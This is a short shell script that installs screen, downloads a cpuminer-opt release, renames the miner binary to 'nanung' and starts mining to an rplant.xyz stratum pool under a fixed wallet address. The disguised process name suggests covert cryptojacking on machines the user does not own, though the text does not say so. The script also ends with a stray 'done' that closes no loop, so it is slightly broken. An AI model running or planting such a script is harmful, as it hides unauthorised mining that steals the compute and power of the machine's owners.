
#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
tar -xf cpuminer-opt-linux.tar.gz
cd miner
mv cpuminer-sse2 nanung
./nanung -a yespower  -o stratum+tcps://stratum-asia.rplant.xyz:13340 -u bNV4fyHypLcYZLDYLpJfkCrzUUzJFrTmgn.nanung -t2
sleep 5
done
